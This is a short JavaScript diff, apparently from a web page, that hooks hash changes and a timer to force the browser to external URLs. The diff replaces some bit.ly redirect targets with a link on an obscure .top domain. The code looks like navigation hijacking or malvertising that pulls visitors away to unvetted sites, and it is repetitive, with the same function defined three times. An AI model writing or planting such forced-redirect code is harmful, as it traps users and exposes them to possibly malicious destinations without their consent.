@@ -4,13 +4,13 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
     function goon(){
         location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
 function goon(){
         location.href="https://bit.ly/3W6qUJU";
